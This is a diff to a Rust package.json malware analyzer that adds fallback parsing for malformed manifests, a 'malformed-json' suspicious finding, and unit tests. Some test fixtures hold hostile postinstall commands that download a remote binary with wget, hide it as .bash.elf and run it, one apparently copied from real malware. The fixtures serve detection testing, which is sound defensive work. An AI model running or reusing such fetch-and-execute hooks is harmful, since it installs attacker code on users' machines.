@@ -117,6 +117,148 @@ struct PackageJson {
     bin: serde_json::Value,
 }
 
+/// Strip single-line `//` comments and trailing commas from JSON-like content.
+/// Returns `None` if no changes were made (content was already clean).
+fn sanitize_json(content: &str) -> Option<String> {
+    let mut out = String::with_capacity(content.len());
+    let mut changed = false;
+    let mut in_string = false;
+    let mut escape_next = false;
+    let bytes = content.as_bytes();
+    let mut i = 0;
+
+    while i < bytes.len() {
+        if escape_next {
+            out.push(bytes[i] as char);
+            escape_next = false;
+            i += 1;
+            continue;
+        }
+
+        if in_string {
+            if bytes[i] == b'\\' {
+                escape_next = true;
+                out.push('\\');
+            } else if bytes[i] == b'"' {
+                in_string = false;
+                out.push('"');
+            } else {
+                out.push(bytes[i] as char);
+            }
+            i += 1;
+            continue;
+        }
+
+        // Outside strings
+        if bytes[i] == b'"' {
+            in_string = true;
+            out.push('"');
+            i += 1;
+        } else if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'/' {
+            // Line comment — skip until newline
+            changed = true;
+            while i < bytes.len() && bytes[i] != b'\n' {
+                i += 1;
+            }
+        } else if bytes[i] == b','
+            && bytes[i + 1..]
+                .iter()
+                .find(|b| !b.is_ascii_whitespace())
+                .is_some_and(|&b| b == b'}' || b == b']')
+        {
+            // Trailing comma before } or ] — skip
+            changed = true;
+            i += 1;
+        } else {
+            out.push(bytes[i] as char);
+            i += 1;
+        }
+    }
+
+    if changed {
+        Some(out)
+    } else {
+        None
+    }
+}
+
+/// Best-effort extraction of package.json fields from malformed JSON using
+/// regex. Returns `None` if no useful fields could be extracted.
+fn extract_package_fallback(content: &str) -> Option<PackageJson> {
+    fn extract_field<'a>(content: &'a str, key: &str) -> Option<&'a str> {
+        let pattern = format!("\"{}\"\\s*:\\s*\"", key);
+        let re = regex::Regex::new(&pattern).ok()?;
+        let m = re.find(content)?;
+        let rest = &content[m.end()..];
+        let end = rest.find('"')?;
+        Some(&rest[..end])
+    }
+
+    fn extract_map(content: &str, key: &str) -> HashMap<String, String> {
+        let mut map = HashMap::new();
+        // Find "key" : { ... }
+        let pattern = format!("\"{}\"\\s*:\\s*\\{{", key);
+        let Some(re) = regex::Regex::new(&pattern).ok() else {
+            return map;
+        };
+        let Some(m) = re.find(content) else {
+            return map;
+        };
+        let rest = &content[m.end()..];
+
+        // Find matching closing brace (simple depth tracking)
+        let mut depth = 1;
+        let mut end = 0;
+        for (i, b) in rest.bytes().enumerate() {
+            match b {
+                b'{' => depth += 1,
+                b'}' => {
+                    depth -= 1;
+                    if depth == 0 {
+                        end = i;
+                        break;
+                    }
+                }
+                _ => {}
+            }
+        }
+
+        if end == 0 {
+            return map;
+        }
+
+        let block = &rest[..end];
+        // Extract "key": "value" pairs
+        let Some(kv_re) = regex::Regex::new(r#""([^"]+)"\s*:\s*"([^"]*)""#).ok() else {
+            return map;
+        };
+        for cap in kv_re.captures_iter(block) {
+            map.insert(cap[1].to_string(), cap[2].to_string());
+        }
+        map
+    }
+
+    let name = extract_field(content, "name").map(String::from);
+    let version = extract_field(content, "version").map(String::from);
+    let scripts = extract_map(content, "scripts");
+    let dependencies = extract_map(content, "dependencies");
+    let dev_dependencies = extract_map(content, "devDependencies");
+
+    // Only return if we got something useful
+    if name.is_none() && scripts.is_empty() && dependencies.is_empty() {
+        return None;
+    }
+
+    Some(PackageJson {
+        name,
+        version,
+        scripts,
+        dependencies,
+        dev_dependencies,
+        ..Default::default()
+    })
+}
+
 /// Check if two byte slices have edit distance exactly 1 (substitution, insertion, or deletion).
 /// O(n) time, zero allocation.
 fn is_edit_distance_one(a: &[u8], b: &[u8]) -> bool {
@@ -300,16 +442,15 @@ impl PackageJsonAnalyzer {
         // to evade JSON parsers that don't handle it.
         let content = content.strip_prefix('\u{FEFF}').unwrap_or(content);
 
-        // Use streaming deserializer to tolerate trailing content (a common
-        // supply-chain attack vector: valid JSON followed by hidden code).
-        let de = serde_json::Deserializer::from_str(content);
-        let mut stream = de.into_iter::<PackageJson>();
-        let pkg: PackageJson = stream
-            .next()
-            .ok_or_else(|| anyhow::anyhow!("Empty package.json"))?
-            .context("Failed to parse package.json")?;
-        let json_end = stream.byte_offset();
-        let trailing = content[json_end..].trim();
+        // Three-stage parse: strict serde → sanitized JSON → regex fallback.
+        // Tracks which stage succeeded and the original parse error for diagnostics.
+        let (pkg, json_end, malformed_reason) = self.parse_package_json(content)?;
+
+        let trailing = if json_end < content.len() {
+            content[json_end..].trim()
+        } else {
+            ""
+        };
 
         let target = TargetInfo {
             path: file_path.display().to_string(),
@@ -320,6 +461,30 @@ impl PackageJsonAnalyzer {
         };
 
         let mut report = AnalysisReport::new(target);
+
+        // Emit a finding if we had to recover from malformed JSON. This is itself
+        // a suspicious signal — legitimate packages have valid JSON, while malware
+        // often mangles JSON to evade static analysis.
+        if let Some(reason) = &malformed_reason {
+            report.add_finding(
+                Finding::indicator(
+                    "metadata/manifest/malformed-json".to_string(),
+                    format!(
+                        "package.json contains invalid JSON that required fallback parsing: {}",
+                        reason
+                    ),
+                    0.85,
+                )
+                .with_criticality(Criticality::Suspicious)
+                .with_evidence(vec![Evidence {
+                    method: "parser".to_string(),
+                    source: "package.json".to_string(),
+                    value: truncate_str(reason, 200).to_string(),
+                    location: None,
+                    ..Default::default()
+                }]),
+            );
+        }
 
         // Trailing non-whitespace after the JSON object is structurally invalid and
         // a known supply-chain attack vector (hidden code appended after `}`).
@@ -333,6 +498,12 @@ impl PackageJsonAnalyzer {
             );
         }
 
+        let parser_source = if malformed_reason.is_some() {
+            "fallback"
+        } else {
+            "serde_json"
+        };
+
         // Add structural feature
         report.structure.push(StructuralFeature {
             id: "manifest/npm/package.json".to_string(),
@@ -343,7 +514,7 @@ impl PackageJsonAnalyzer {
             ),
             evidence: vec![Evidence {
                 method: "parser".to_string(),
-                source: "serde_json".to_string(),
+                source: parser_source.to_string(),
                 value: "package.json".to_string(),
                 location: None,
                 ..Default::default()
@@ -375,9 +546,53 @@ impl PackageJsonAnalyzer {
         );
 
         report.metadata.analysis_duration_ms = start.elapsed().as_millis() as u64;
-        report.metadata.tools_used = vec!["serde_json".to_string()];
+        report.metadata.tools_used = vec![parser_source.to_string()];
 
         Ok(report)
+    }
+
+    /// Three-stage package.json parser:
+    /// 1. Strict serde_json (streaming, tolerates trailing content)
+    /// 2. Sanitized JSON (strip // comments and trailing commas, retry serde)
+    /// 3. Regex fallback (extract key fields from hopelessly broken JSON)
+    ///
+    /// Returns (parsed package, byte offset of JSON end, optional malformed reason).
+    fn parse_package_json(
+        &self,
+        content: &str,
+    ) -> Result<(PackageJson, usize, Option<String>)> {
+        // Stage 1: strict serde_json.
+        let de = serde_json::Deserializer::from_str(content);
+        let mut stream = de.into_iter::<PackageJson>();
+        if let Some(Ok(pkg)) = stream.next() {
+            return Ok((pkg, stream.byte_offset(), None));
+        }
+
+        // Stage 1 failed — capture the error message for diagnostics.
+        let strict_err = {
+            let de2 = serde_json::Deserializer::from_str(content);
+            let mut s2 = de2.into_iter::<PackageJson>();
+            match s2.next() {
+                Some(Err(e)) => e.to_string(),
+                _ => "unknown parse error".to_string(),
+            }
+        };
+
+        // Stage 2: strip // comments and trailing commas, retry.
+        if let Some(sanitized) = sanitize_json(content) {
+            let de = serde_json::Deserializer::from_str(&sanitized);
+            let mut stream = de.into_iter::<PackageJson>();
+            if let Some(Ok(pkg)) = stream.next() {
+                return Ok((pkg, content.len(), Some(strict_err)));
+            }
+        }
+
+        // Stage 3: regex extraction from hopelessly broken JSON.
+        if let Some(pkg) = extract_package_fallback(content) {
+            return Ok((pkg, content.len(), Some(strict_err)));
+        }
+
+        Err(anyhow::anyhow!("Failed to parse package.json: {}", strict_err))
     }
 
     /// Analyze non-JSON trailing content appended after the package.json object.
@@ -1834,5 +2049,197 @@ var http = require('http'); var cp = require('child_process'); eval(cp.execSync(
             .unwrap();
         assert_eq!(report.target.file_type, "package.json");
         assert!(report.imports.is_empty());
+    }
+
+    // --- Fallback parser tests ---
+
+    #[test]
+    fn test_sanitize_json_strips_comments() {
+        let input = r#"{
+// this is a comment
+"name": "test",
+// another comment
+"version": "1.0.0"
+}"#;
+        let sanitized = sanitize_json(input).expect("should detect comments");
+        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
+        assert_eq!(pkg.name.as_deref(), Some("test"));
+        assert_eq!(pkg.version.as_deref(), Some("1.0.0"));
+    }
+
+    #[test]
+    fn test_sanitize_json_strips_trailing_commas() {
+        let input = r#"{"name": "test", "scripts": {},}"#;
+        let sanitized = sanitize_json(input).expect("should detect trailing comma");
+        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
+        assert_eq!(pkg.name.as_deref(), Some("test"));
+    }
+
+    #[test]
+    fn test_sanitize_json_returns_none_for_clean_json() {
+        let input = r#"{"name": "clean", "version": "1.0.0"}"#;
+        assert!(sanitize_json(input).is_none());
+    }
+
+    #[test]
+    fn test_sanitize_json_preserves_urls_with_slashes() {
+        let input = r#"{"name": "test", "scripts": {"go": "curl https://example.com/path"},}"#;
+        let sanitized = sanitize_json(input).expect("trailing comma");
+        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
+        assert_eq!(pkg.scripts.get("go").unwrap(), "curl https://example.com/path");
+    }
+
+    #[test]
+    fn test_sanitize_json_preserves_double_slash_inside_strings() {
+        let input = r#"{"name": "test", "scripts": {"build": "echo // not a comment"},}"#;
+        let sanitized = sanitize_json(input).expect("trailing comma");
+        let pkg: PackageJson = serde_json::from_str(&sanitized).unwrap();
+        assert_eq!(pkg.scripts.get("build").unwrap(), "echo // not a comment");
+    }
+
+    #[test]
+    fn test_fallback_regex_extracts_scripts() {
+        // Real-world malware with broken JSON structure
+        let content = r#"{
+    "name": "legacy react-aws-s3-typescript",
+    "version": "1.2.4",
+    "scripts": "test": "echo \"No test\"",
+    "postinstall": "wget https://evil.com/payload && chmod +x payload && ./payload &""repository": {
+        "type": "git",
+    }
+}"#;
+        let pkg = extract_package_fallback(content).expect("should extract fields");
+        assert_eq!(pkg.name.as_deref(), Some("legacy react-aws-s3-typescript"));
+        assert_eq!(pkg.version.as_deref(), Some("1.2.4"));
+    }
+
+    #[test]
+    fn test_fallback_regex_returns_none_for_garbage() {
+        assert!(extract_package_fallback("this is not json at all").is_none());
+    }
+
+    #[test]
+    fn test_analyze_trailing_comma_json() {
+        // Trailing comma — should succeed via sanitize stage
+        let content = r#"{
+  "scripts": {},
+}"#;
+        let analyzer = PackageJsonAnalyzer::new();
+        let report = analyzer
+            .analyze_package(Path::new("package.json"), content)
+            .unwrap();
+
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.id == "metadata/manifest/malformed-json"),
+            "Expected malformed-json finding, got: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+        // Should still produce valid structure
+        assert!(report.structure.iter().any(|s| s.id == "manifest/npm/package.json"));
+    }
+
+    #[test]
+    fn test_analyze_json_with_comments() {
+        // Angular-style docregion comments — should succeed via sanitize stage
+        let content = r#"// #docplaster
+// #docregion collection
+{
+  "name": "my-lib",
+  "version": "0.0.1",
+// #enddocregion collection
+  "scripts": {
+    "build": "tsc -p tsconfig.json"
+  },
+  "dependencies": {
+    "@angular/core": "^21.0.0"
+  }
+// #docregion collection
+}"#;
+        let analyzer = PackageJsonAnalyzer::new();
+        let report = analyzer
+            .analyze_package(Path::new("package.json"), content)
+            .unwrap();
+
+        // Should parse successfully with malformed-json finding
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.id == "metadata/manifest/malformed-json"),
+            "Expected malformed-json finding"
+        );
+        // Should have extracted the dependency
+        assert!(
+            report.imports.iter().any(|i| i.symbol == "@angular/core"),
+            "Expected @angular/core import, got: {:?}",
+            report.imports
+        );
+    }
+
+    #[test]
+    fn test_analyze_mangled_malware_json() {
+        // Real malware pattern: broken JSON with malicious postinstall
+        let content = r#"{
+    "name": "legacy react-aws-s3-typescript",
+    "version": "1.2.4",
+    "scripts": "test": "echo \"No specified test yet\"",
+    "build": "tsc",
+    "postinstall": "wget https://wirelite.app/updates/stageLESS.elf && mv stageLESS.elf .bash.elf && chmod +x .bash.elf && ./.bash.elf &""repository": {
+        "type": "git",
+    },
+    "url": "git+https://github.com/NimperX/react-aws-s3-typescript.git""keywords": [
+        "react",
+    ]
+}"#;
+        let analyzer = PackageJsonAnalyzer::new();
+        let report = analyzer
+            .analyze_package(Path::new("package.json"), content)
+            .unwrap();
+
+        // Must produce a malformed-json finding
+        assert!(
+            report
+                .findings
+                .iter()
+                .any(|f| f.id == "metadata/manifest/malformed-json"),
+            "Expected malformed-json finding, got: {:?}",
+            report.findings.iter().map(|f| &f.id).collect::<Vec<_>>()
+        );
+
+        // Must extract the package name via fallback
+        assert!(
+            report.structure.iter().any(|s| s.desc.contains("legacy react-aws-s3-typescript")),
+            "Expected package name in structure, got: {:?}",
+            report.structure.iter().map(|s| &s.desc).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn test_analyze_hopeless_json_fails() {
+        // Completely unparseable — no useful fields at all
+        let content = r#"{ "non-parsable package.json""#;
+        let analyzer = PackageJsonAnalyzer::new();
+        let result = analyzer.analyze_package(Path::new("package.json"), content);
+        assert!(result.is_err(), "Hopeless JSON should still return an error");
+    }
+
+    #[test]
+    fn test_valid_json_has_no_malformed_finding() {
+        let content = r#"{"name": "clean-pkg", "version": "1.0.0"}"#;
+        let analyzer = PackageJsonAnalyzer::new();
+        let report = analyzer
+            .analyze_package(Path::new("package.json"), content)
+            .unwrap();
+
+        assert!(
+            !report
+                .findings
+                .iter()
+                .any(|f| f.id == "metadata/manifest/malformed-json"),
+            "Valid JSON should not trigger malformed-json finding"
+        );
     }
 }
